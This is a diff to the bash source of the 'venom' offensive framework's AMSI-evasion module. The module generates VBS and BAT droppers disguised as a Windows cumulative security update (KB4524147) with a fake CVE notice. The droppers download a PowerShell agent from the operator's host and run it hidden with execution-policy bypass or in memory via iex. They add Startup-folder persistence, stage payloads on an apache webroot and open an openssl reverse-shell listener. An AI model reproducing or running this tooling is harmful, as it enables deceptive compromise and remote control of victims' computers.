@@ -12018,7 +12018,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
-   rpath=$(zenity --title="☠ Enter 'Silent Dropper' Build Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For 'Silent Dropper' build.\nRemark: Only PS environment var's accepted!" --entry --width 350) > /dev/null 2>&1
+   rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Upload.\nRemark: Only PS environment var's accepted!" --entry --width 350) > /dev/null 2>&1
 fi
 
 
@@ -12031,7 +12031,7 @@ if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
 ## Display final settings to user
-if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then ext="ps1"; else ext="vbs"; fi
+if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then ext="ps1";tech="$rpath"; else ext="vbs";tech="In-Memory"; fi
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
@@ -12040,7 +12040,7 @@ cat << !
     LOLBin   : WinHttpRequest
     DROPPER  : $IPATH/output/$Drop.$ext
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOADTO : Fileless (In-Memory)
+    UPLOADTO : Fileless ($tech)
     SILENT EXECUTION : $easter_egg
 !
 echo "---"
@@ -12072,12 +12072,12 @@ else
    # REMARK: A MessageBox will pop up announcing that are KB updates available.
    # TODO: Wait for @coding9 to know if shell works.. then: & ('ie'+'x')
    echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
-   echo "Dim domain,x,k" >> $IPATH/output/$Drop.vbs
+   echo "Dim domain,x,u" >> $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
    echo "domain = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
    echo "x=MsgBox(\"This Security Patch Adresses CVE-2020-12067\"  & vbCrLf & \"RCE Vulnerability Under OS Builds 18362.535\" ,0+48, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
    echo "objShell.Run \"cmd /c powershell \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0, True" >> $IPATH/output/$Drop.vbs
-   echo "k=MsgBox(\"Security Update Successfully Installed ..\" ,0+64, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
+   echo "u=MsgBox(\"Security Update Successfully Installed ..\" ,0+64, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
 fi
 
 
@@ -12162,6 +12162,7 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
+
 ## Build Report File in output folder ..
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
    echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
@@ -12187,8 +12188,8 @@ sh_menu
 sh_evasion2 () {
 Colors;
 
-## Make sure openssl dependencies are installed
 imp=$(which openssl)
+## Make sure openssl dependencie its installed
 if ! [ "$?" -eq "0" ]; then
    echo "${RedF}[x]${BlueF} [${YellowF}openssl${BlueF}]${white} package not found, Please install it .."${Reset};sleep 2
    echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}execute${BlueF}]${YellowF} sudo apt-get install openssl"${Reset};sleep 2
@@ -12272,18 +12273,16 @@ else
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
-   ## Persistence script updated to hidde the 'powershell execution command'
-   # better persistence social engineering build
+   ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      ## Silent Agent execution (no terminal prompt) using VBS script.
+      ## Silent Persistence script execution (no terminal prompt) using VBS script.
       echo "' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.bat
    else
+      ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo PoWeRsHeLl Get-HotFix -Description 'Security Update' >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    fi
@@ -12345,9 +12344,8 @@ fi
 cd $IPATH
 
 
-## Copy files to apache2 webroot
 cd $IPATH/output
-# zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+## Copy files to apache2 webroot
 zip $Drop.zip $Drop.bat > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
@@ -12370,7 +12368,7 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
-xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo Listening on [any] $lport ..;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo Listening on [any] $lport ..;echo OpenSSL: [key].pem [cert].pem;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
 cd $IPATH
 sleep 2
 
@@ -12509,18 +12507,16 @@ else
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   ## Persistence script updated to hidde the 'powershell execution command'
-   # better persistence social engineering build
+   ## Persistence Module Function (VBScript|BATch)
    if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      ## Silent Agent execution (no terminal prompt) using VBS script.
+      ## Silent Persistence script execution (no terminal prompt) using VBS script.
       echo "' Framework: venom v1.0.16 (amsi evasion) > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" > $IPATH/output/$Drop.$ext.bat
       echo "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo objShell.Run \"cmd /c PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File $rpath\\$NaM.ps1\", 0, True >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
    else
+      ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo PoWeRsHeLl Get-HotFix -Description 'Security Update' >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo timeout /T 2 ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    fi
@@ -12570,8 +12566,8 @@ fi
 cd $IPATH
 
 
-## Copy ALL files to apache2 webroot 
 cd $IPATH/output
+## Copy ALL files to apache2 webroot 
 zip $Drop.zip $Drop.$ext.bat > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
